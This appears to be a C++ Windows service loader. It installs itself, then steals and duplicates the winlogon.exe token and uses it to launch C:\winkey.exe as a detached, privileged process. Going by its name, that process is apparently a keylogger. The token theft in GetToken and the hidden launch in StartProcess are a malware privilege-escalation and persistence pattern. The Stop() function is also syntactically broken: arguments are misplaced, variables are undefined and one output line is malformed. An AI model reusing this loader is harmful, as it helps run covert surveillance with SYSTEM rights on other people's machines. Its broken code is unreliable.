#include "svc.h"

void Service::Install()
{
	std::cout << "Installing service\n";

	/* Open service manager */
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == nullptr) {
		std::cout << std::format("OpenSCManager failed ({})\n", GetLastError());
		return;
	}

	/* Create service with permissions */
	SC_HANDLE schService = CreateService(
		schSCManager,
		SVCNAME,
		SVCNAME,
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		"C:\\svc.exe",
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);
	if (schService == nullptr) {
		const DWORD lastError = GetLastError();
		if (lastError == 1073) {
			std::cout << "Service is already installed";
		}
		else {
			std::cout << std::format("CreateService failed ({})\n", GetLastError());
		}
		CloseServiceHandle(schSCManager);
		return;
	}

	std::cout << "Service installed successfully\n";

	/* Cleanup handles */
	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}

SC_HANDLE Service::getService()
{
	/* Open handle to ServiceManger */
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == nullptr) {
		const DWORD lastError = GetLastError();
		if (lastError == ERROR_ACCESS_DENIED) {
			std::cout << "Make sure you launched with admins rights\n";
		}
		else {
			std::cout << std::format("OpenSCManager failed ({})\n", lastError);
		}
		return nullptr;
	}

	/* Open handle to service */
	SC_HANDLE schService = OpenService(
		schSCManager,
		SVCNAME,
		SERVICE_ALL_ACCESS
	);
	CloseServiceHandle(schSCManager);
	if (schService == nullptr) {
		std::cout << std::format("OpenService failed ({})\n", GetLastError());
		return nullptr;
	}
	return schService;
}

void Service::Start()
{
	/* Fetch service */
	auto schService = Service::getService();
	if (schService == nullptr) {
		return;
	}

	/* Start service */
	std::cout << "Starting service\n";
	if (StartService(schService, 0, nullptr)) {
		std::cout << "Service started succesfully\n";
	}
	else {
		const DWORD lastError = GetLastError();
		if (lastError == ERROR_SERVICE_ALREADY_RUNNING) {
			std::cout << "Service already started\n";
		}
		else {
			std::cout << std::format("Service failed to start ({})\n", lastError);
		}
	}

	/* Cleanup handle */
	CloseServiceHandle(schService);
}

/*
    Reference: https://docs.microsoft.com/fr-fr/windows/win32/services/stopping-a-service
*/
void Service::Stop()
{
	/* Fetch service */
	auto schService = Service::getService();
	if (schService == nullptr) {
		return;
	}

    SERVICE_STATUS_PROCESS ssp;
    DWORD dwBytesNeeded;

    /* Make sure the service is not already stopped. */
    if (!QueryServiceStatusEx(
        schService,
        SC_STATUS_PROCESS_INFO
        (LPBYTE)&ssp,
        sizeof(SERVICE_STATUS_PROCESS)
        &dwBytesNeeded,
    )) {
        std::cout << std::format("QueryServiceStatusEx failed ({})\n", GetLastError()); 
        goto stop_cleanup;
    }

    if (ssp.dwCurrentState == SERVICE_STOPPED) {
        std::cout << "Service is already stopped\n";
        goto stop_cleanup;
    }

    /* If a stop is pending, wait for it. */
    while (ssp.dwCurrentState == SERVICE_STOP_PENDING) {
        std::cout << "Service stop pending...\n";

        /*
            Do not wait longer than the wait hint. A good interval is 
            one-tenth of the wait hint but not less than 1 second  
            and not more than 10 seconds.
        */ 
 
        DWORD dwWaitTime = ssp.dwWaitHint / 10;
        if (dwWaitTime < 1000)
            dwWaitTime = 1000;
        else if (dwWaitTime > 10000)
            dwWaitTime = 10000;
        
        Sleep(dwWaitTime);
        if (!QueryServiceStatusEx(schService,
            SC_STATUS_PROCESS_INFO,
            (LPBYTE)&ssp, 
            sizeof(SERVICE_STATUS_PROCESS),
            &dwBytesNeeded,
        )){
            std::cout << std::format("QueryServiceStatusEx failed {}\n", GetLastError());
            goto stop_cleanup;
        }

        if (ssp.dwCurrentState == SERVICE_STOPPED) {
            std::cout << "Service stopped successfully.\n";
            goto stop_cleanup;
        }

        if (GetTickCount() - dwStartTime > dwTimeout) {
            std::cout << "Service stop timed out.\n";
            goto stop_cleanup;
        }
    }

    // If the service is running, dependencies must be stopped first.
    StopDependentServices();

    // Send a stop code to the service.
    if (!ControlService(
        schService,
        SERVICE_CONTROL_STOP,
        (LPSERVICE_STATUS) &ssp,
    )) {
        std::cout << std::format("ControlService failed ({})\n", GetLastError());
        goto stop_cleanup;
    }

    /* Wait for the service to stop. */
    while (ssp.dwCurrentState != SERVICE_STOPPED) {
        Sleep(ssp.dwWaitHint);
        if (!QueryServiceStatusEx( schService, 
            SC_STATUS_PROCESS_INFO,
            (LPBYTE)&ssp, 
            sizeof(SERVICE_STATUS_PROCESS),
            &dwBytesNeeded,
        )) {
            std::cout << "" std::format("QueryServiceStatusEx failed ({})\n", GetLastError());
            goto stop_cleanup;
        }

        if (ssp.dwCurrentState == SERVICE_STOPPED)
            break;

        if (GetTickCount() - dwStartTime > dwTimeout) {
            std::cout << "Wait timed out\n";
            goto stop_cleanup;
        }
    }
    std::cout << "Service stopped successfully\n";

	/* Cleanup handle */
stop_cleanup:
	CloseServiceHandle(schService);
}

void Service::Delete()
{
	/* Fetch service */
	auto schService = Service::getService();
	if (schService == nullptr) {
		return;
	}

	/* Send service stop event */
	if (ControlService(schService, SERVICE_CONTROL_STOP, &Service::gSvcStatus)) {
		std::cout << "Stopping service\n";
		while (QueryServiceStatus(schService, &Service::gSvcStatus)) {
			if (Service::gSvcStatus.dwCurrentState == SERVICE_STOP_PENDING) {
				std::cout << ".";
				std::this_thread::sleep_for(std::chrono::milliseconds(250));
			}
			else {
				break;
			}
		}
	}

	if (DeleteService(schService)) {
		std::cout << "Service has been removed\n";
	}
	else {
		std::cout << std::format("DeleteService failed ({})\n", GetLastError());
	}

	/* Cleanup handle */
	CloseServiceHandle(schService);
}

void WINAPI Service::Main()
{
	/* Save handle to edit the status later */
	Service::gSvcStatusHandle = RegisterServiceCtrlHandler(
		SVCNAME,
		reinterpret_cast<LPHANDLER_FUNCTION>(ControlHandler)
	);

	if (!Service::gSvcStatusHandle) {
		std::cout << "RegisterServiceCtrlHandler failed\n";
		return;
	}

	Service::gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	Service::gSvcStatus.dwServiceSpecificExitCode = 0;

	/* Set service to Pending */
	ReportStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

	/* Init service and continue flow */
	Service::Init();
}

void WINAPI Service::Init()
{
	/* Create startup event */
	Service::ghSvcStopEvent = CreateEvent(
		nullptr,
		TRUE,
		FALSE,
		nullptr
	);
	if (Service::ghSvcStopEvent == nullptr) {
		ReportStatus(SERVICE_STOPPED, GetLastError(), 0);
		return;
	}

	/* Set service running state */
	ReportStatus(SERVICE_RUNNING, NO_ERROR, 0);

	/* Setup service subprocess */
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	/* Create the detached process to host the winkey */
	Service::StartProcess(&si, &pi);

	/* Wait until service stop request */
	while (1) {
		WaitForSingleObject(Service::ghSvcStopEvent, INFINITE);
		ReportStatus(SERVICE_STOPPED, NO_ERROR, 0);
		break;
	}

	/* Force terminate process */
	if (pi.hProcess) {
		TerminateProcess(pi.hProcess, 0);
	}

	/* Cleanup handles */
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(si.hStdInput);
	CloseHandle(si.hStdError);
	CloseHandle(si.hStdOutput);
}

/* From microsoft docs */
void WINAPI Service::ControlHandler(DWORD dwCtrl)
{
	switch (dwCtrl) {
	case SERVICE_CONTROL_STOP:
		ReportStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);

		SetEvent(Service::ghSvcStopEvent);
		ReportStatus(Service::gSvcStatus.dwCurrentState, NO_ERROR, 0);
        
        return;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	default:
		break;
	}
}

/* From microsoft docs */
void Service::ReportStatus(DWORD dwCurrentState,
	DWORD dwWin32ExitCode,
	DWORD dwWaitHint)
{
	static DWORD dwCheckPoint = 1;

	Service::gSvcStatus.dwCurrentState = dwCurrentState;
	Service::gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
	Service::gSvcStatus.dwWaitHint = dwWaitHint;

	/* Compute status */
	if (dwCurrentState == SERVICE_START_PENDING) {
		Service::gSvcStatus.dwControlsAccepted = 0;
	}
	else {
		Service::gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	}

	if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED)) {
		Service::gSvcStatus.dwCheckPoint = 0;
	}
	else {
		Service::gSvcStatus.dwCheckPoint = ++dwCheckPoint;
	}

	/* Set new status */
	SetServiceStatus(Service::gSvcStatusHandle, &Service::gSvcStatus);
}

/*
	Source: https://stackoverflow.com/q/13480344
*/
HANDLE Service::GetToken()
{
	/* Snapshot the current processes */
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		std::cout << std::format("CreateToolhelp32Snapshot failed ({})\n", GetLastError());
		return nullptr;
	}

	/* Create container for futur process */
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	/* Find the first process of the snapshot */
	if (!Process32First(hProcessSnap, &pe32)) {
		std::cout << std::format("Process32First failed ({})\n", GetLastError());
		CloseHandle(hProcessSnap);
		return nullptr;
	}

	/* Find winlogon PID */
	DWORD logonPID = 0;
	do {
		if (lstrcmpi(pe32.szExeFile, TEXT("winlogon.exe")) == 0) {
			logonPID = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));
	CloseHandle(hProcessSnap);
	if (logonPID == 0) {
		std::cout << std::format("Process32Next failed ({})\n", GetLastError());
		return nullptr;
	}

	/* Open HANDLE to winlogon process using PID */
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, logonPID);
	if (hProcess == nullptr) {
		std::cout << std::format("OpenProcess failed ({})\n", GetLastError());
		return nullptr;
	}

	/* Fetch the token from the process */
	HANDLE hToken = nullptr;
	OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken);
	CloseHandle(hProcess);
	if (hToken == nullptr) {
		std::cout << std::format("OpenProcessToken failed ({})\n", GetLastError());
		return nullptr;
	}

	/* Duplicate token using Impersonation */
	HANDLE hTokenD = nullptr;
	DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hTokenD);
	CloseHandle(hToken);
	if (hTokenD == nullptr) {
		std::cout << std::format("DuplicateTokenEx failed ({})\n", GetLastError());
		return nullptr;
	}

	return hTokenD;
}

void Service::StartProcess(STARTUPINFO* si, PROCESS_INFORMATION* pi)
{
	/* Fetch impersonated token */
	HANDLE hToken = GetToken();
	if (hToken == nullptr) {
		std::cout << std::format("GetToken failed ({})\n", GetLastError());
		return;
	}

	/* Open the winkey process, detached with the token */
	CreateProcessAsUser(hToken,
		TEXT("C:\\winkey.exe"),
		nullptr,
		nullptr,
		nullptr,
		false,
		NORMAL_PRIORITY_CLASS | DETACHED_PROCESS,
		NULL,
		NULL,
		si,
		pi
	);

	/* Free token handle we previously copied */
	CloseHandle(hToken);
}

/*
	__cdecl__: Stack is cleanup by the caller
	_tmain	 : Windows conversion to enable Unicode support
*/
int __cdecl _tmain(int argc, TCHAR* argv[])
{
	/* Handle commands */
	if (argc == 2) {
		if (lstrcmpi(argv[1], TEXT("install")) == 0) {
			Service::Install();
			return 0;
		}
		else if (lstrcmpi(argv[1], TEXT("start")) == 0) {
			Service::Start();
			return 0;
		}
		else if (lstrcmpi(argv[1], TEXT("stop")) == 0) {
			Service::Stop();
			return 0;
		}
		else if (lstrcmpi(argv[1], TEXT("delete")) == 0) {
			Service::Delete();
			return 0;
		}
	}

	/* Define service entry point */
	SERVICE_TABLE_ENTRY DispatchTable[] = {{
			const_cast<LPSTR>(SVCNAME),
			reinterpret_cast<LPSERVICE_MAIN_FUNCTION>(Service::Main)},
		{NULL, NULL}
	};

	/* Connect the thread as a service dispatcher */
	StartServiceCtrlDispatcher(DispatchTable);
	return 0;
}